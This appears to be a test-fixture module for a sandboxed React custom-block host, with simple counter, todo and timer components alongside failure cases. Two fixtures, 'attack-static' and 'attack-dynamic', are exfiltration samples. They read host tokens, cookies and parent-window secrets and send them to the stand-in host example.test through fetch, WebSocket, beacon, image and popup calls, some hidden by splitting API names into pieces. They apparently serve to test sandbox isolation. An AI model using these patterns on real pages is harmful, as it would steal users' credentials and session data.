import { protocol } from '../../server/custom-block/protocol.mjs'
import { BUILD_PIN, PACKAGE_PINS } from '../../server/custom-block/policy.mjs'

const emptyObject = {
  type: 'object',
  properties: {},
  required: [],
  additionalProperties: false,
}

function objectSchema(properties) {
  return { type: 'object', properties, required: Object.keys(properties), additionalProperties: false }
}

function artifact({ definitionId, name, entry, source, propsSchema = emptyObject, maxBundleBytes }) {
  return {
    artifactVersion: 1,
    manifest: {
      protocolVersion: 1,
      definitionId,
      name,
      sdkVersion: '1.0.0',
      entry,
      propsSchema,
      stateSchema: emptyObject,
      events: {},
      requestedCapabilities: [],
    },
    sources: { [entry]: source },
    dependencies: {
      react: { version: PACKAGE_PINS.react.version, integrity: PACKAGE_PINS.react.integrity },
    },
    build: {
      ...BUILD_PIN,
      toolchain: { ...BUILD_PIN.toolchain },
      maxBundleBytes: maxBundleBytes ?? BUILD_PIN.maxBundleBytes,
    },
  }
}

async function fixture(key, definition, props = {}) {
  const source = artifact(definition)
  const versionDigest = await protocol.computeVersionDigest(source)
  return {
    instance: {
      id: `fixture-${key}`,
      definitionId: source.manifest.definitionId,
      versionDigest,
      props,
    },
    artifact: source,
  }
}

const counter = `
import { useState } from 'react'
export default function Counter() {
  const [count, setCount] = useState(0)
  return <section aria-label="Counter">
    <p data-testid="count">{count}</p>
    <button type="button" onClick={() => setCount(value => value + 1)}>增加</button>
    <button type="button" onClick={() => setCount(0)}>重置</button>
  </section>
}
`

const todo = `
import { useState } from 'react'
type Item = { id: number; text: string; done: boolean }
export default function TodoList() {
  const [items, setItems] = useState<Item[]>([])
  const [text, setText] = useState('')
  const [nextId, setNextId] = useState(1)
  const add = () => {
    const value = text.trim()
    if (!value) return
    setItems(current => [...current, { id: nextId, text: value, done: false }])
    setNextId(value => value + 1)
    setText('')
  }
  return <section aria-label="Todo List">
    <input aria-label="新任务" value={text} onChange={event => setText(event.target.value)} />
    <button type="button" onClick={add}>添加</button>
    <ul>{items.map(item => <li key={item.id}>
      <button type="button" aria-label={\`切换 \${item.text}\`} onClick={() => setItems(current => current.map(entry => entry.id === item.id ? { ...entry, done: !entry.done } : entry))}>{item.done ? '已完成' : '未完成'}</button>
      <span>{item.text}</span>
      <button type="button" aria-label={\`删除 \${item.text}\`} onClick={() => setItems(current => current.filter(entry => entry.id !== item.id))}>删除</button>
    </li>)}</ul>
    <p data-testid="todo-count">{items.length}</p>
  </section>
}
`

const pomodoro = `
import { useEffect, useState } from 'react'
export default function Pomodoro({ seconds = 3 }: { seconds?: number }) {
  const [remaining, setRemaining] = useState(seconds)
  const [running, setRunning] = useState(false)
  useEffect(() => {
    if (!running || remaining <= 0) return
    const timer = setTimeout(() => setRemaining(value => Math.max(0, value - 1)), 1000)
    return () => clearTimeout(timer)
  }, [running, remaining])
  useEffect(() => { if (remaining === 0) setRunning(false) }, [remaining])
  const label = String(Math.floor(remaining / 60)).padStart(2, '0') + ':' + String(remaining % 60).padStart(2, '0')
  return <section aria-label="Pomodoro">
    <p aria-label="剩余时间" data-testid="remaining">{label}</p>
    <button type="button" onClick={() => setRunning(true)} disabled={running || remaining === 0}>开始</button>
    <button type="button" onClick={() => setRunning(false)} disabled={!running}>暂停</button>
    <button type="button" onClick={() => { setRunning(false); setRemaining(seconds) }}>重置</button>
    <p role="status">{remaining === 0 ? '本轮专注已完成' : running ? '专注中' : '已暂停'}</p>
  </section>
}
`

const error = `
export default function RenderError() {
  throw new Error('fixture render error')
}
`

const loop = `
export default function InfiniteLoop() {
  while (true) {}
}
`

const attackStatic = `
import { useState } from 'react'
export default function StaticAttack() {
  const [value, setValue] = useState('')
  return <button type="button" onClick={() => { setValue(localStorage.getItem('host-token') ?? ''); fetch('https://example.test/leak') }}>{value || '攻击'}</button>
}
`

const attackDynamic = `
import { useState } from 'react'
export default function DynamicAttack() {
  const [result, setResult] = useState<Record<string, string>>({})
  const run = () => {
    const out: Record<string, string> = {}
    const g = globalThis as any
    const w = window as any
    const d = document as any
    const n = navigator as any
    const name = (parts: string[]) => parts.join('')
    try {
      const parentWindow = w[name(['par', 'ent'])]
      out.parent = parentWindow.document.getElementById('host-secret')?.textContent ?? 'none'
    } catch (error) { out.parent = (error as Error).name }
    try { out.storage = g[name(['local', 'Storage'])].getItem('host-token') ?? 'none' } catch (error) { out.storage = (error as Error).name }
    try { out.cookie = d[name(['coo', 'kie'])] || 'empty' } catch (error) { out.cookie = (error as Error).name }
    try { g[name(['fet', 'ch'])].call(g, 'https://example.test/leak'); out.fetch = 'started' } catch (error) { out.fetch = (error as Error).name }
    try { new (g[name(['Web', 'Socket'])])('wss://example.test/leak'); out.ws = 'started' } catch (error) { out.ws = (error as Error).name }
    try { n[name(['send', 'Beacon'])].call(n, 'https://example.test/beacon', 'payload'); out.beacon = 'started' } catch (error) { out.beacon = (error as Error).name }
    try { g[name(['op', 'en'])].call(g, 'https://example.test/popup'); out.open = 'started' } catch (error) { out.open = (error as Error).name }
    const image = new Image()
    image.src = 'https://example.test/pixel'
    out.image = 'requested'
    setResult(out)
  }
  return <section aria-label="Attack">
    <button type="button" onClick={run}>运行攻击测试</button>
    <p data-testid="attack-result">{JSON.stringify(result)}</p>
    <a href="https://example.test/top" target="_top" data-testid="top-link">尝试顶层跳转</a>
  </section>
}
`

const illegalImport = `
import fs from 'node:fs'
export default function IllegalImport() {
  return <div>{fs ? 'loaded' : 'none'}</div>
}
`

export async function createFixtures() {
  return Object.freeze({
    counter: await fixture('counter', { definitionId: 'fixture-counter', name: '计数器', entry: 'src/Counter.tsx', source: counter }),
    todo: await fixture('todo', { definitionId: 'fixture-todo', name: '待办清单', entry: 'src/Todo.tsx', source: todo }),
    pomodoro: await fixture('pomodoro', {
      definitionId: 'fixture-pomodoro', name: '番茄钟', entry: 'src/Pomodoro.tsx', source: pomodoro,
      propsSchema: objectSchema({ seconds: { type: 'integer', minimum: 1, maximum: 60 } }),
    }, { seconds: 3 }),
    error: await fixture('error', { definitionId: 'fixture-error', name: '渲染错误', entry: 'src/Error.tsx', source: error }),
    loop: await fixture('loop', { definitionId: 'fixture-loop', name: '死循环', entry: 'src/Loop.tsx', source: loop }),
    'attack-static': await fixture('attack-static', { definitionId: 'fixture-attack-static', name: '静态攻击', entry: 'src/StaticAttack.tsx', source: attackStatic }),
    'attack-dynamic': await fixture('attack-dynamic', { definitionId: 'fixture-attack-dynamic', name: '动态攻击', entry: 'src/DynamicAttack.tsx', source: attackDynamic }),
    'illegal-import': await fixture('illegal-import', { definitionId: 'fixture-illegal-import', name: '非法导入', entry: 'src/IllegalImport.tsx', source: illegalImport }),
    'bundle-limit': await fixture('bundle-limit', {
      definitionId: 'fixture-bundle-limit', name: '包体超限', entry: 'src/Counter.tsx', source: counter, maxBundleBytes: 100,
    }),
  })
}
